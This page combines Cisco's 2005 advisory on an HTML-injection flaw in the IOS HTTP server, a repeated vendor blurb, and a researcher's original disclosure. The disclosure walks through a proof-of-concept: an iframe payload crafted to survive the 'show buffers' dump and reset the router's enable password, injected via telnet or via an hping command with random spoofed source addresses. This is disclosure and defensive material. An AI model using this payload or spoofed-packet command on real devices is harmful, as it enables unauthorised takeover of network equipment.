Summary
=======
A vulnerability exists in the IOS HTTP server in which HTML code
inserted into dynamically generated output, such as the output from a
"show buffers" command, will be passed to the browser requesting the
page. This HTML code could be interpreted by the client browser and
potentially execute malicious commands against the device or other
possible cross-site scripting attacks. Successful exploitation of this
vulnerability requires that a user browse a page containing dynamic
content in which HTML commands have been injected.
Cisco will be making free software available to address this
vulnerability for affected customers. There are workarounds available
to mitigate the effects of the vulnerability.
This advisory is posted at
http://www.cisco.com/warp/public/707/cisco-sa-20051201-http.shtml.
Affected Products
=================
This security advisory applies to all Cisco products that run Cisco IOS
Software versions 11.0 through 12.4 with the HTTP server enabled. A
system which contains the IOS HTTP server or HTTP secure server, but
does not have it enabled, is not affected.
To determine if the HTTP server is running on your device, issue the
"show ip http server status" and "show ip http server secure status"
commands at the prompt and look for output similar to:
Router>show ip http server status
HTTP server status: Enabled
If the device is not running the HTTP server, you should see output
similar to:
Router>show ip http server status
HTTP server status: Disabled
Any version of Cisco IOS prior to the versions which will be listed in
the Fixed Software section below may be vulnerable.
Cisco IOS XR is not affected.
To determine the software running on a Cisco product, log in to the
device and issue the "show version" command to display the system banner.
Cisco IOS Software will identify itself as "Internetwork Operating
System Software" or simply "IOS". On the next line of output, the image
name will be displayed between parentheses, followed by "Version" and
the IOS release name. Other Cisco devices will not have the "show
version" command or will give different output.
The following example identifies a Cisco product running IOS release
12.3(6) with an installed image name of C3640-I-M:
Cisco Internetwork Operating System Software
IOS (tm) 3600 Software (C3640-I-M), Version 12.3(6), RELEASE SOFTWARE (fc3)
The next example shows a product running IOS release 12.3(11)T3 with an
image name of C3845-ADVIPSERVICESK9-M:
Cisco IOS Software, 3800 Software (C3845-ADVIPSERVICESK9-M), Version 12.3(11)T3, RELEASE SOFTWARE (fc4)
Technical Support: http://www.cisco.com/techsupport
Copyright (c) 1986-2005 by Cisco Systems, Inc.
Additional information about Cisco IOS release naming can be found at
http://www.cisco.com/warp/public/620/1.html.
No other Cisco products are currently known to be affected by the
vulnerability addressed in this advisory.
Details
=======
The Cisco IOS Web browser interface (which enables the device to
perform as an HTTP server) allows configuration and monitoring of a
router or access server using any web browser. This feature was
introduced in IOS 11.0.
A vulnerability exists in the IOS HTTP server in which HTML code
inserted into dynamically generated output, such as the output from a
"show buffers" command, will be passed to the browser requesting the
page. This HTML code could be interpreted by the browser and
potentially execute malicious commands against the device or other
possible cross-site scripting attacks.
In order to be vulnerable to the cross-site scripting attack, a user
must browse and view the content during the same period of time the
injected code exists in memory. On the other hand, if a user does not
browse contaminated dynamic content on the device, then exploitation is
not possible.
A proof of concept exploit exists for this vulnerability, in which the
exploit attempts to reset the enable password on the device. For the
attack to work against the device itself, the user browsing tainted
dynamic content on the router will only be able to execute commands at
or below the privilege level for which they are authenticated and
authorized for on the device.
This vulnerability is documented in Cisco Bug ID CSCsc64976.
Impact
======
Successful exploitation of the vulnerability may result in an attacker
executing commands on the device, including the possibility of gaining
full administrative privileges on the device which is dependent on the
privilege level of the authenticated user.
Software Versions and Fixes
===========================
No software fixes are currently available. This section will be updated
regularly as soon as software fixes are available.
Workarounds
===========
Disable the HTTP server
+----------------------
If the HTTP server is not used for any legitimate purposes on the
device, it is a best practice to disable it by issuing the following
commands in configure mode:
no ip http server
no ip http secure-server
Disable the HTTP WEB\_EXEC service
+--------------------------------
A feature was introduced in 12.3(14)T and later in which selective HTTP
and HTTPS services could be enabled or disabled. Two typical services
are WEB\_EXEC and the IOS Certificate Server (SCEP). The WEB\_EXEC
service provides a facility to configure the box and retrieve current
state of the box from remote clients. The IOS Certificate Server
service provides a facility wherein remote clients can enroll and
obtain Crypto Certificates.
It is possible to disable the WEB\_EXEC service while still leaving SCEP
running to serve Certificates. If an installation requires the use of
the SCEP service, the WEB\_EXEC service may be disabled via the commands
in configure mode:
no ip http active-session-modules WEB\_EXEC
no ip http secure-active-session-modules WEB\_EXEC
Avoid the use of Web-based SHOW commands
+---------------------------------------
Successful exploitation of this vulnerability requires an unsuspecting
user to request dynamic content from the device via the "show" commands
which are available. Avoiding the use of those commands via the web
interface until an upgrade to fixed software is possible may be
perfectly legitimate for some installations.
Obtaining Fixed Software
========================
Cisco will make free software available to address this vulnerability
for affected customers. This advisory will be updated as fixed software
becomes available. Prior to deploying software, customers should
consult their maintenance provider or check the software for feature
set compatibility and known issues specific to their environment.
Customers may only install and expect support for the feature sets they
have purchased. By installing, downloading, accessing or otherwise
using such software upgrades, customers agree to be bound by the terms
of Cisco's software license terms found at
http://www.cisco.com/public/sw-license-agreement.html, or as otherwise
set forth at Cisco.com Downloads at
http://www.cisco.com/public/sw-center/sw-usingswc.shtml.
Do not contact either "psirt (at) cisco (dot) com [email concealed]" or "security-alert (at) cisco (dot) com [email concealed]"
for software upgrades.
Customers with Service Contracts
+-------------------------------
Customers with contracts should obtain upgraded software through their
regular update channels. For most customers, this means that upgrades
should be obtained through the Software Center on Cisco's worldwide
website at http://www.cisco.com.
Customers using Third-party Support Organizations
+------------------------------------------------
Customers whose Cisco products are provided or maintained through prior
or existing agreement with third-party support organizations such as
Cisco Partners, authorized resellers, or service providers should
contact that support organization for guidance and assistance with the
appropriate course of action in regards to this advisory.
The effectiveness of any workaround or fix is dependent on specific
customer situations such as product mix, network topology, traffic
behavior, and organizational mission. Due to the variety of affected
products and releases, customers should consult with their service
provider or support organization to ensure any applied workaround or
fix is the most appropriate for use in the intended network before it
is deployed.
Customers without Service Contracts
+----------------------------------
Customers who purchase direct from Cisco but who do not hold a Cisco
service contract and customers who purchase through third-party vendors
but are unsuccessful at obtaining fixed software through their point of
sale should get their upgrades by contacting the Cisco Technical
Assistance Center (TAC). TAC contacts are as follows.
\* +1 800 553 2447 (toll free from within North America)
\* +1 408 526 7209 (toll call from anywhere in the world)
\* e-mail: tac (at) cisco (dot) com [email concealed]
Have your product serial number available and give the URL of this
notice as evidence of your entitlement to a free upgrade. Free upgrades
for non-contract customers must be requested through the TAC.
Refer to http://www.cisco.com/warp/public/687/Directory/DirTAC.shtml

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

| **- Cisco IOS HTTP Server code injection vulnerability-**    ``` SUMMARY   It has been identified a vulnerability in the Cisco IOS Web Server. An attacker can inject arbitrary code in some of the dynamically generated web pages. To succesfully exploit the vulnerability  the attacker only needs to know the IP of the Cisco. THERE'S NO NEED TO HAVE ACCESS TO THE WEB SERVER! Once the code has been injected, attacker must wait until the admin browses some of the affected web pages. The Cisco HTTP Server is used to manage cisco routers via web browser. It's not an usual way of management, and as far I know, it is not enabled by default, but still there could be people doing management and/or monitoring tasks via HTTP protocol. In cisco own words: "The HTTP server was introduced in IOS release 11.0 to extend router management to the worldwide web."   AFFECTED PRODUCTS  The vulnerability found has been identified on CISCO 3620 with IOS 12.0(2a). No other Cisco routers have been tested... try on your own device and have fun!  That is the output of the "show version" command on my Cisco. ---------------------------------------------------------------------------------- Cisco>show versionCisco Internetwork Operating System SoftwareIOS (tm) 3600 Software (C3620-IS-M), Version 12.0(2a), RELEASE SOFTWARE (fc1)Copyright (c) 1986-1999 by cisco Systems, Inc.Compiled Sat 02-Jan-99 08:33 by phanguyeImage text-base: 0x600088E0, data-base: 0x608D0000 ```  ROM: System Bootstrap, Version 11.1(20)AA2, EARLY DEPLOYMENT RELEASE SOFTWARE (f c1)  Cisco uptime is 26 minutes System restarted by power-on System image file is "flash:c3620-is-mz\_120-2a.bin"  cisco 3620 (R4700) processor (revision 0x81) with 24576K/8192K bytes of memory.  (...)  ``` -----------------------------------------------------------------   DETAILS   There is a URL in the IOS Web Server:   /level/15/exec/-/show/buffers    where administrators can view the content of memory buffers. There are many options, but we are interested in:   "all" --> all buffers  and,  "assigned" --> Buffers in use   Following those links will show you those options:  "dump" --> Show buffer header and all data "header" --> Show buffer headder only "packet" --> Show buffer header and packet data   The "dump" and "packet" options are clearly affected by the code injection. In my P.o.C. exploit I will  focus on the "dump" option. The "packet" option can be exploited in a similar way.  So, let us explain this flaw a little bit more. The next link:  /level/15/exec/-/buffers/assigned/dump  will dump in an HTML formatted page the content of the buffer header and all the data of the  assigned memory buffers... If you telnet to the cisco router and just after you make an HTTP request to the URL showed above, you will see all the data you sent via telnet socket,... and you will see, of course, the password you entered at the login prompt... So, what will happen if an attacker exploits this field to inject code? The code will be dumped in the HTML page... and if there's NO sanity check, then code will be executed in the client side context. That is, an usual code injection, similar to XSS.  The first problem I had, was how to exploit this to really take profit on a common scenario. Cisco Web Server  doesn't make use of session cookies, instead Basic HTTP authentication is used... Is not impossible to exploit it, but we should use XMLhttp library and nowadays many browsers doesn't allow to do what could be done some years ago... But there's still some chances, for example, iframe tags. Injecting HTML iframe tags we can force  the victim to make "GET" request... ummm, it seems that Cisco Web forms are sending data via "POST" method... Fortunately, many (all?) requests can be done also via GET method, so, a request like this:  /level/15/configure/-/enable/secret/mypassword  will change the ENABLE password to "mypassword"... :-)  That's our first shot trying to inject code, via standard Cisco telnet prompt (on routers where "Username" is required, the exploitation can be done in the same way).  User Acess Verification  Password: mycodemycodemycodemycodemycodemycodemycodemycodemycodemycodemycodemycodemycodemycode (etc,...)  Then we go to the "/level/15/exec/-/buffers/assigned/dump" page, and looking at the source code:     we can check that there's a litle problem: the injected code is broken due to the format of the dumped page. Our code (mycodemycodemycodemycodemycodemycodemycode  etc,...) now looks like this:  "mycodemycode 018033D0: 6D79636F 64656D79 636F6465 6D79636F  mycodemycodemyco 018033E0: 64656D79 636F6465 6D79636F 64656D79  demycodemycodemy 018033F0: 636F6465 6D79636F 64656D79 636F6465 codemycodemycode 01803400: 6D79636F 64656D79 636F6465 6D79636F  mycodemycodemyco01803410: 64656D79 636F6465 6D79636F 64656D79  demycodemycodemy"  OK. Fortunately for us, the code is always in the same position, so we can know "where" the code will be broken, and thus making easier to build an injected code that can bypass that restriction.  Let us try with a real code. We want to inject this:   <iframe src="../../../../configure/enable/secret/ih"    This code, once injected and executed by the browser should make an HTTP request to the Cisco and change the "enable" password to "ih"...  The dump will be something like this:  (...) XXXXXXXX: XXXXXXXX XXXXXXXX XXXXXXXX XXXXXXXX  ....<iframe src=XXXXXXXX: XXXXXXXX XXXXXXXX XXXXXXXX XXXXXXXX  "../../../../conXXXXXXXX: XXXXXXXX XXXXXXXX XXXXXXXX XXXXXXXX  figure/enable/seXXXXXXXX: XXXXXXXX XXXXXXXX XXXXXXXX XXXXXXXX  cret/ih"........ (...)  The HTML as viewed by the browser will be:  <iframe src= XXXXXXXX: XXXXXXXX XXXXXXXX XXXXXXXX XXXXXXXX  "../../../../con XXXXXXXX: XXXXXXXX  XXXXXXXX XXXXXXXX XXXXXXXX  figure/enable/se XXXXXXXX: XXXXXXXX XXXXXXXX XXXXXXXX XXXXXXXX  cret/ih"  Of course, this shit will not work :-( So let's trick the code a litle (just a litle...). After playing around a bit with HTML I found a suitable way to make it work. Our injected code could be like this:   <iframe     src="./../../..//../../../../..//../configure////../enable/././//../secret/ih"  You can do it by hand via telnet:    And then the resulting dump will be something like this:  (...) 01804400: 5D040000 3C696672 616D6520 20202020  ]...<iframe     01804410: 7372633D 222E2F2E 2E2F2E2E 2F2E2E2F  src="./../../../01804420: 2F2E2E2F 2E2E2F2E 2E2F2E2E 2F2E2E2F  /../../../../../01804430: 2F2E2E2F 636F6E66 69677572 652F2F2F  /../configure///01804440: 2F2E2E2F 656E6162 6C652F2E 2F2E2F2F  /../enable/././/01804450: 2F2E2E2F 73656372 65742F69 68220A21  /../secret/ih".! (...)  And the HTML code will be:  <iframe     01804410: 7372633D 222E2F2E 2E2F2E2E 2F2E2E2F  src="./../../../ 01804420:  2F2E2E2F 2E2E2F2E 2E2F2E2E 2F2E2E2F  /../../../../../ 01804430: 2F2E2E2F 636F6E66  69677572 652F2F2F  /../configure/// 01804440: 2F2E2E2F 656E6162 6C652F2E 2F2E2F2F   /../enable/./.// 01804450: 2F2E2E2F 73656372 65742F69 68220A21  /../secret/ih"  wich will "magically" work... OK, not magically :-) but, i think it's due to the syntax of the "iframe" tag that will ignore "01804410: 7372633D 222E2F2E 2E2F2E2E 2F2E2E2F" as parameters of the "iframe" that the browser do not understand, but then it comes "src=" and all the URL is between quotation marks, so the browser will read it in one shot. What about the strange code that brokes the URL...? No problem :-) If you take a look on how the URL is built, you will notice that after any "offending" string you can find one or more "/../". That is to avoid having the URL broken by the Web Server due to a non existant directory. So summarizing, we can reference any resource, just because:  src="./../../../this_directory_does_not_exist/../"   is the same as:  src="./../../../"   And this makes me think the next: should web servers allow URL's that contains non existant directories...? I'm not a coder, and I've never coded a web server, so I can't answer that question, maybe some one can help me on this topic...  Here you have a snapshot of what would see the victim in the browser once the exploit has been launched:     Now that we know how to inject code via telnet prompt, some body could think: "I do no allow access to the telnet server of my Cisco from the Internet...". Ummm... yes, so let's play a bit more (I still have a cold beer and I have a litle time before my girlfriend starts claiming some resources for herself...)  We have talked about dumps of memory... so why botter about opening a socket (via telnet, for example)... as far I know, almost any operating system should store in memory (more or less time) any packet with destination it's IP address .... ANY? So if we ping the cisco? We will see the ICMP echo request in some of the buffers? Yes, we will see it. Probably, (*almost) any packet with destination the Cisco or going THROUGH the Cisco will be stored in memory (for a litle time at least). This makes me think about a lot of possililities... And, the last question: should the packet have a valid source address? Emmmm,... hei Beavies...what do you think about it? :-))  So let's try this:  hping -2 --rand-source -s 53 -p 53 -d 100 -E payload.txt <Cisco_IP>  Where "payload.txt" contains:  <iframe src="./../../..//../../../../..//../configure////../enable/././//../secret/ih"....  On my Cisco 3620, this works very fine.  *Notice: The IOS does some kind of sanity check on the format of the packet, so be careful that "-d" option of hping2... it must fit the payload size.  At the end, bad news are that the IOS Web Server could be a field of mines..., and the worst is that the attacker can exploit this with ramdom spoofed IP's...   You can't stop the attack and you can't track the attacker...   Of course, if your Cisco do not have IOS HTTP Server, you can forget this advisory.   ```  ``` Hugo Vazquez Carameswww.infohacking.com--------------------------------------------        ```  [INFOHACKING\_RESEARCH\_DIRECTORY](http://www.infohacking.com/INFOHACKING_RESEARCH/Our_Advisories/)  [GO TO START PAGE](http://www.infohacking.com/) |
